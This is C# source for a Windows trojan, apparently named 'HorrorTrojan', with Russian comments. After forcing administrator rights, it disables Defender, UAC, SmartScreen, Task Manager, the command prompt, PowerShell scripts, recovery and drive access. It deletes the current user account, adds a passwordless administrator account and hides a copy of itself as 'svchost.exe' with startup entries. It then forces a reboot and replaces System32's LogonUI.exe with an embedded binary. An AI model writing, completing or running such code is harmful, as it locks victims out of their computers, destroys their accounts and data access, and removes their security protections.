using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using HorrorTrojan;

namespace LogonUIInstaller
{
    internal static class Program
    {
        private static Mutex mutex;
        private static string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows";

        [STAThread]
        static void Main(string[] args)
        {
            bool createdNew;
            mutex = new Mutex(true, "Global\\LogonUIInstallerMutex", out createdNew);
            if (!createdNew) return;

            try
            {
                // ========== СТАДИЯ 2: ЗАПУСК ФОРМЫ (после перезагрузки) ==========
                if (args.Length > 0 && args[0] == "stage2")
                {
                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);

                    // УДАЛЯЕМ LogonUI.exe (замена на кастомный)
                    ReplaceLogonUI();

                    // ЗАПУСКАЕМ ФОРМУ
                    MainInterface ui = new MainInterface();
                    ui.Show();
                    Application.Run();
                    return;
                }

                // ========== СТАДИЯ 1: УСТАНОВЩИК (первый запуск) ==========
                if (!IsElevated())
                {
                    RestartAsAdmin();
                    return;
                }

                // Выполняем все блокировки и настройки
                ApplySystemBlocks();
                DisableAntivirusAndUAC();
                ReplaceWallpaperAndCursors();
                ReplaceUserAccount(); // ← НОВАЯ ВЕРСИЯ (удаляет пользователя ДО перезагрузки)
                AddToStartupWithStage2();

                // Принудительная перезагрузка
                ForceReboot();
            }
            finally
            {
                mutex?.ReleaseMutex();
                mutex?.Dispose();
            }
        }

        // ==================== ЗАМЕНА LogonUI.exe ====================
        private static void ReplaceLogonUI()
        {
            try
            {
                string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
                if (!File.Exists(originalPath)) return;

                ForceFullAccess(originalPath);
                KillLogonUIProcesses();

                File.SetAttributes(originalPath, FileAttributes.Normal);
                for (int i = 0; i < 5; i++)
                {
                    try
                    {
                        File.Delete(originalPath);
                        break;
                    }
                    catch
                    {
                        Thread.Sleep(1000);
                        try
                        {
                            File.Move(originalPath, originalPath + ".del");
                            File.Delete(originalPath + ".del");
                            break;
                        }
                        catch { }
                    }
                }

                byte[] customLogonUI = ExtractResource("LogonUI.exe");
                File.WriteAllBytes(originalPath, customLogonUI);
            }
            catch { }
        }

        private static void ForceFullAccess(string path)
        {
            try
            {
                File.SetAttributes(path, FileAttributes.Normal);
            }
            catch { }

            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "takeown.exe",
                    Arguments = $"/f \"{path}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                p?.WaitForExit(3000);
                p?.Close();
            }
            catch { }

            try
            {
                Process p = Process.Start(new ProcessStartInfo
                {
                    FileName = "icacls.exe",
                    Arguments = $"\"{path}\" /grant Everyone:F",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                p?.WaitForExit(3000);
                p?.Close();
            }
            catch { }

            try
            {
                FileInfo fi = new FileInfo(path);
                FileSecurity fs = fi.GetAccessControl();
                fs.SetOwner(WindowsIdentity.GetCurrent().User);
                fs.AddAccessRule(new FileSystemAccessRule(
                    new NTAccount(Environment.UserDomainName, Environment.UserName),
                    FileSystemRights.FullControl, AccessControlType.Allow));
                fs.AddAccessRule(new FileSystemAccessRule(
                    new NTAccount("NT AUTHORITY\\SYSTEM"),
                    FileSystemRights.FullControl, AccessControlType.Allow));
                fi.SetAccessControl(fs);
            }
            catch { }
        }

        private static void KillLogonUIProcesses()
        {
            try
            {
                foreach (Process p in Process.GetProcessesByName("LogonUI"))
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(p.MainModule.FileName) &&
                            p.MainModule.FileName.Contains("System32"))
                        {
                            p.Kill();
                            p.WaitForExit(3000);
                            Thread.Sleep(500);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static byte[] ExtractResource(string resourceName)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            using (Stream stream = assembly.GetManifestResourceStream(resourceName) ??
                  assembly.GetManifestResourceStream($"LogonUIInstaller.{resourceName}"))
            {
                if (stream == null) throw new Exception($"Resource {resourceName} not found");
                byte[] data = new byte[stream.Length];
                stream.Read(data, 0, data.Length);
                return data;
            }
        }

        // ==================== УСТАНОВЩИК ====================
        private static bool IsElevated()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                .IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void RestartAsAdmin()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = Assembly.GetEntryAssembly().Location,
                    Verb = "runas",
                    UseShellExecute = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }
            Environment.Exit(0);
        }

        private static void ForceReboot()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "shutdown",
                    Arguments = "/r /f /t 0",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });
            }
            catch { }
            Environment.Exit(0);
        }

        private static void ApplySystemBlocks()
        {
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                    key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                    key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                    key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                    key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);

                using (var key = Registry.ClassesRoot.CreateSubKey(@".vbs"))
                    key.SetValue("", "txtfile", RegistryValueKind.String);
                using (var key = Registry.ClassesRoot.CreateSubKey(@".vbe"))
                    key.SetValue("", "txtfile", RegistryValueKind.String);

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Recovery"))
                    key.SetValue("DisableRecovery", 1, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\SafeBoot"))
                    key.SetValue("OptionValue", 1, RegistryValueKind.DWord);

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);

                using (var key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\BootManager"))
                {
                    key.SetValue("BootMenuPolicy", 1, RegistryValueKind.DWord);
                    key.SetValue("DisplayBootMenu", 0, RegistryValueKind.DWord);
                }

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                {
                    key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
                    key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        private static void DisableAntivirusAndUAC()
        {
            try
            {
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
                    key.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
                    key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
                }

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
                    key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
            }
            catch { }
        }

        private static void ReplaceWallpaperAndCursors()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string targetDir = Path.Combine(appData, "SystemUpdate");
                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);

                ExtractResourceToFile("wd.webp", Path.Combine(targetDir, "wd.webp"));
                ExtractResourceToFile("fg.ani", Path.Combine(targetDir, "fg.ani"));

                using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop"))
                {
                    key.SetValue("Wallpaper", Path.Combine(targetDir, "wd.webp"), RegistryValueKind.String);
                    key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
                    key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
                }

                string cursorPath = Path.Combine(targetDir, "fg.ani");
                using (var key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors"))
                {
                    key.SetValue("Arrow", cursorPath, RegistryValueKind.String);
                    key.SetValue("Help", cursorPath, RegistryValueKind.String);
                    key.SetValue("AppStarting", cursorPath, RegistryValueKind.String);
                    key.SetValue("Wait", cursorPath, RegistryValueKind.String);
                    key.SetValue("Crosshair", cursorPath, RegistryValueKind.String);
                    key.SetValue("IBeam", cursorPath, RegistryValueKind.String);
                    key.SetValue("NWPen", cursorPath, RegistryValueKind.String);
                    key.SetValue("No", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNS", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeWE", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNWSE", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeNESW", cursorPath, RegistryValueKind.String);
                    key.SetValue("SizeAll", cursorPath, RegistryValueKind.String);
                    key.SetValue("UpArrow", cursorPath, RegistryValueKind.String);
                }

                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
                    key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);

                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                    key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            }
            catch { }
        }

        private static void ExtractResourceToFile(string name, string outputPath)
        {
            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name))
                {
                    if (stream == null) return;
                    byte[] data = new byte[stream.Length];
                    stream.Read(data, 0, data.Length);
                    File.WriteAllBytes(outputPath, data);
                    File.SetAttributes(outputPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                }
            }
            catch { }
        }

        // ==================== НОВАЯ ВЕРСИЯ: УДАЛЕНИЕ ПОЛЬЗОВАТЕЛЯ ====================
        private static void ReplaceUserAccount()
        {
            try
            {
                string currentUser = Environment.UserName;
                string newUser = "CLOSE YOUR EYES";

                // 1. СОЗДАЁМ НОВОГО ПОЛЬЗОВАТЕЛЯ (БЕЗ ПАРОЛЯ)
                Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = $"user \"{newUser}\" /add /active:yes",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });

                // 2. ДОБАВЛЯЕМ НОВОГО ПОЛЬЗОВАТЕЛЯ В АДМИНИСТРАТОРЫ (ВРЕМЕННО)
                Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = $"localgroup Administrators \"{newUser}\" /add",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });

                // 3. УДАЛЯЕМ СТАРОГО ПОЛЬЗОВАТЕЛЯ (ПРЯМО СЕЙЧАС)
                Process.Start(new ProcessStartInfo
                {
                    FileName = "net",
                    Arguments = $"user {currentUser} /delete /y",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false
                });

                // 4. ПРИНУДИТЕЛЬНЫЙ ВЫХОД ИЗ СИСТЕМЫ (ЧТОБЫ НЕ БЫЛО КОНФЛИКТОВ)
                // ДОБАВЛЯЕМ В АВТОЗАГРУЗКУ ПРИНУДИТЕЛЬНЫЙ ВЫХОД
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce"))
                {
                    key.SetValue("Logoff", $"shutdown /l /f /t 0", RegistryValueKind.String);
                }
            }
            catch { }
        }

        private static void AddToStartupWithStage2()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string targetDir = Path.Combine(appData, "SystemUpdate");
                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);

                string selfPath = Assembly.GetEntryAssembly().Location;
                string destPath = Path.Combine(targetDir, "svchost.exe");
                if (File.Exists(selfPath) && !File.Exists(destPath))
                {
                    File.Copy(selfPath, destPath, true);
                }

                File.SetAttributes(destPath, FileAttributes.Hidden | FileAttributes.ReadOnly);
                File.SetAttributes(targetDir, FileAttributes.Hidden | FileAttributes.ReadOnly);

                // Добавляем в автозагрузку с аргументом stage2
                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run"))
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"))
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"))
                    key.SetValue("SystemUpdate", $"\"{destPath}\" stage2", RegistryValueKind.String);
            }
            catch { }
        }
    }
}
